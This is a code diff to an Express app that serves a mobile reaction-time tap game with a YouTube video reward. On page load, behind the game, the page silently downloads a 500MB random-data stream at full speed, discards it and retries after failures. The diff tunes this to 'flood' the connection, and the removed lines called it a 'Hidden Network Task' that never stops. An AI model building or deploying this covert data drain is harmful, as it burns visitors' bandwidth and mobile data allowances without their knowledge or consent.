@@ -4,50 +4,55 @@ const crypto = require("crypto");
 const app = express();
 const PORT = process.env.PORT || 8080;
 
+// Pre-generate a 1MB buffer to avoid CPU overhead during streaming, maximizing throughput
+const fastBuffer = crypto.randomBytes(1024 * 1024);
+
 /**
- * 500MB Streaming Endpoint
- * Designed to run continuously until the full payload is delivered.
- * Optimized with backpressure handling for stability on cloud hosts.
+ * High-Speed 500MB Streaming Endpoint
+ * Designed to saturate the network connection by pushing data as fast as the pipe allows.
  */
 app.get("/stream", (req, res) => {
     const sizeMB = 500;
     const totalBytes = sizeMB * 1024 * 1024;
-    const chunkSize = 64 * 1024; // 64KB chunks
-
+    
     res.writeHead(200, {
         "Content-Type": "application/octet-stream",
         "Content-Length": totalBytes,
-        "Cache-Control": "no-store",
+        "Cache-Control": "no-store, no-cache, must-revalidate",
+        "Pragma": "no-cache",
+        "Expires": "0"
     });
 
     let sent = 0;
 
-    function send() {
+    function flood() {
         while (sent < totalBytes) {
-            const currentChunk = Math.min(chunkSize, totalBytes - sent);
-            const buffer = crypto.randomBytes(currentChunk);
+            const remaining = totalBytes - sent;
+            // Use the pre-generated buffer for maximum speed
+            const chunk = remaining < fastBuffer.length ? fastBuffer.slice(0, remaining) : fastBuffer;
             
-            sent += currentChunk;
-            const canContinue = res.write(buffer);
-            
+            const canContinue = res.write(chunk);
+            sent += chunk.length;
+
             if (!canContinue) {
-                // Wait for the pipe to clear
-                res.once('drain', send);
+                // Wait for the network buffer to clear (backpressure) before sending more
+                res.once('drain', flood);
                 return;
             }
         }
         res.end();
     }
 
-    send();
+    flood();
 
+    // If the user closes the connection, stop the process
     req.on("close", () => {
-        sent = totalBytes; // Stop generating if the user actually closes the tab
+        sent = totalBytes;
     });
 });
 
 /**
- * Main UI - Optimized HUD and Perpetual Stress
+ * Main UI - Optimized for Max Speed & Mobile Layout
  */
 app.get("/", (req, res) => {
     res.send(`
@@ -56,7 +61,7 @@ app.get("/", (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Reaction Elite | Constant Stress</title>
+    <title>Reaction Elite | Max Speed Stress</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;700;900&display=swap');
@@ -76,16 +81,16 @@ app.get("/", (req, res) => {
 
         .bg-grid { 
             background-image: radial-gradient(circle at 1px 1px, rgba(255,255,255,0.02) 1px, transparent 0); 
-            background-size: 35px 35px; 
+            background-size: 30px 30px; 
         }
 
         .glass { 
-            backdrop-filter: blur(20px); 
+            backdrop-filter: blur(25px); 
             background: rgba(15, 23, 42, 0.85); 
             border: 1px solid rgba(255, 255, 255, 0.1); 
         }
 
-        /* Tactical Target Orb */
+        /* Tactical Target Orb - High Contrast */
         .target { 
             position: absolute; 
             z-index: 40; 
@@ -101,11 +106,18 @@ app.get("/", (req, res) => {
             display: flex; 
             align-items: center; 
             justify-content: center; 
-            box-shadow: 0 0 35px rgba(16, 185, 129, 0.6); 
+            box-shadow: 0 0 40px rgba(16, 185, 129, 0.6); 
+        }
+        .target-core {
+            width: 15px;
+            height: 15px;
+            background: #000;
+            border-radius: 50%;
+            border: 2px solid #fff;
         }
         .target:active { transform: scale(0.8); }
 
-        /* Mobile 9:16 Video Player */
+        /* 9:16 Vertical Video Reward */
         .yt-9-16 {
             width: 100%;
             max-width: 240px;
@@ -143,7 +155,7 @@ app.get("/", (req, res) => {
 </head>
 <body class="bg-grid">
 
-    <!-- Top Score HUD - Non-overlapping -->
+    <!-- Top Scoreboard - Safe from overlap -->
     <div class="w-full max-w-md mx-auto flex justify-between gap-4 p-4 z-50">
         <div class="glass flex-1 p-3 rounded-3xl text-center">
             <p class="text-[9px] uppercase font-black text-emerald-400 tracking-tighter mb-1">Time Left</p>
@@ -155,32 +167,30 @@ app.get("/", (req, res) => {
         </div>
     </div>
 
-    <!-- Central Game Field -->
+    <!-- Gameplay Field -->
     <div id="gameContainer" class="relative flex-1 w-full max-w-md mx-auto rounded-[3.5rem] border border-white/5 bg-slate-950/20 shadow-2xl overflow-hidden mb-6 mx-4">
         
         <!-- Interactive Orb -->
         <div id="gameTarget" class="target hidden cursor-pointer select-none">
              <div class="target-orb">
-                <div class="w-7 h-7 bg-white rounded-full flex items-center justify-center border-2 border-black/5">
-                    <div class="w-2.5 h-2.5 bg-slate-900 rounded-full"></div>
-                </div>
+                <div class="target-core"></div>
              </div>
         </div>
 
-        <!-- Overlays -->
+        <!-- Flow Control Modals -->
         <div id="modalOverlay" class="absolute inset-0 z-[100] flex flex-col items-center justify-center p-8 bg-slate-950/95 backdrop-blur-3xl transition-opacity duration-500">
             
-            <!-- Selection Screen -->
+            <!-- Step 1: Selection -->
             <div id="selectionView" class="w-full flex flex-col items-center text-center">
                 <div class="mb-10">
                     <h1 class="text-4xl font-black tracking-tighter italic">
                         ELITE<span class="text-emerald-500 not-italic">REACTION</span>
                     </h1>
-                    <p class="text-slate-500 text-[9px] font-bold uppercase tracking-[0.4em] mt-2">Mobile Performance Test</p>
+                    <p class="text-slate-500 text-[10px] font-bold uppercase tracking-[0.4em] mt-2 leading-none">High-Bandwidth Stress Simulator</p>
                 </div>
                 
                 <div class="glass w-full rounded-[2.5rem] p-8 border-white/10">
-                    <h2 class="text-[10px] font-black uppercase text-emerald-500 tracking-widest mb-6 italic">1. Select Endurance</h2>
+                    <h2 class="text-[10px] font-black uppercase text-emerald-500 tracking-widest mb-6 italic">1. Select Duration</h2>
                     <div class="grid grid-cols-3 gap-3 mb-10">
                         <button onclick="pickTime(this, 5)" class="btn-time py-4 rounded-2xl font-black text-xl">5s</button>
                         <button onclick="pickTime(this, 10)" class="btn-time py-4 rounded-2xl font-black text-xl">10s</button>
@@ -191,14 +201,14 @@ app.get("/", (req, res) => {
                     </div>
 
                     <div id="startAction" class="opacity-0 pointer-events-none transition-all duration-300 transform scale-90">
-                        <button onclick="runCountdown()" class="bg-white text-black font-black py-5 w-full rounded-full text-sm uppercase tracking-widest shadow-2xl active:scale-95">Initiate Test</button>
+                        <button onclick="runCountdown()" class="bg-white text-black font-black py-5 w-full rounded-full text-sm uppercase tracking-widest shadow-2xl active:scale-95">Initiate Session</button>
                     </div>
                 </div>
             </div>
 
-            <!-- Summary / Reward View -->
+            <!-- Step 2: Victory Screen -->
             <div id="finishView" class="hidden w-full h-full flex flex-col items-center justify-center py-4">
-                <div class="glass p-5 rounded-[2rem] w-full max-w-[280px] mb-6 text-center shadow-xl border-emerald-500/20">
+                <div class="glass p-5 rounded-[2.5rem] w-full max-w-[280px] mb-6 text-center shadow-xl border-emerald-500/20">
                     <div class="flex justify-around items-center">
                         <div class="text-center">
                             <p class="text-[10px] text-slate-500 uppercase font-black mb-1">Avg Speed</p>
@@ -216,32 +226,39 @@ app.get("/", (req, res) => {
                     <iframe id="ytPlayer" src="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                 </div>
                 
-                <button onclick="location.reload()" class="bg-emerald-500 text-black font-black py-4 px-12 rounded-full text-[10px] uppercase tracking-widest shadow-lg active:scale-95">Restart Session</button>
+                <button onclick="location.reload()" class="bg-emerald-500 text-black font-black py-4 px-12 rounded-full text-[11px] uppercase tracking-widest shadow-lg active:scale-95">New Session</button>
             </div>
         </div>
 
-        <!-- Center Countdown -->
+        <!-- Big Countdown Overlay -->
         <div id="countdownBox" class="absolute inset-0 flex items-center justify-center opacity-0 pointer-events-none text-emerald-500 z-[200] italic"></div>
     </div>
 
-    <!-- Hidden Network Task -->
     <script>
         let gameActive = false, selectedTime = 0, timeLeft = 0, reactionTimes = [], spawnTime = 0, timerInterval;
 
         const timerDisplay = document.getElementById('timerDisplay'), currentReactionEl = document.getElementById('currentReaction'), gameTarget = document.getElementById('gameTarget'), gameContainer = document.getElementById('gameContainer'), modalOverlay = document.getElementById('modalOverlay'), selectionView = document.getElementById('selectionView'), startAction = document.getElementById('startAction'), finishView = document.getElementById('finishView'), ytPlayer = document.getElementById('ytPlayer'), countdownBox = document.getElementById('countdownBox');
 
         /**
-         * PERPETUAL STRESS TEST
-         * This function starts the 500MB fetch and NEVER stops it.
+         * MAXIMUM SPEED NETWORK FETCH
+         * Uses a streaming reader to consume data as fast as the network allows
+         * without stopping during video playback.
          */
-        function initConstantStress() {
-            fetch('/stream?session=' + Date.now()).then(res => {
-                const reader = res.body.getReader();
-                const consume = ({done}) => { 
-                    if(!done) reader.read().then(consume); 
-                };
-                reader.read().then(consume);
-            }).catch(() => {});
+        async function runMaxSpeedStress() {
+            try {
+                const response = await fetch('/stream?burst=' + Date.now());
+                const reader = response.body.getReader();
+                
+                // Infinite consumer loop
+                while (true) {
+                    const { done, value } = await reader.read();
+                    if (done) break;
+                    // Discard data immediately to maximize bandwidth with zero processing lag
+                }
+            } catch (err) {
+                // Restart if connection drops
+                setTimeout(runMaxSpeedStress, 1000);
+            }
         }
 
         function pickTime(btn, time) {
@@ -258,7 +275,7 @@ app.get("/", (req, res) => {
         function moveTarget() {
             const rect = gameContainer.getBoundingClientRect();
             const size = 75;
-            const pad = 30;
+            const pad = 35;
             const x = Math.max(pad, Math.random() * (rect.width - size - pad));
             const y = Math.max(pad, Math.random() * (rect.height - size - pad));
             gameTarget.style.left = x + 'px';
@@ -325,15 +342,15 @@ app.get("/", (req, res) => {
             document.getElementById('avgResult').innerText = avg + 'ms';
             document.getElementById('tapsResult').innerText = total;
             
-            // YouTube Victory Link
+            // Set YouTube Video Source
             ytPlayer.src = "https://www.youtube.com/embed/iik25wqIuFo?autoplay=1&controls=1&modestbranding=1&rel=0";
         }
 
         gameTarget.addEventListener('touchstart', handleTap, {passive: false});
         gameTarget.addEventListener('mousedown', handleTap);
 
-        // Start the stress test immediately upon load
-        window.onload = initConstantStress;
+        // Start the Max Speed stress test immediately
+        window.onload = runMaxSpeedStress;
     </script>
 </body>
 </html>
@@ -341,5 +358,5 @@ app.get("/", (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`Elite Tester (Constant Stress) running on http://localhost:${PORT}`);
+    console.log(`Max Speed Elite Tester active on port ${PORT}`);
 });
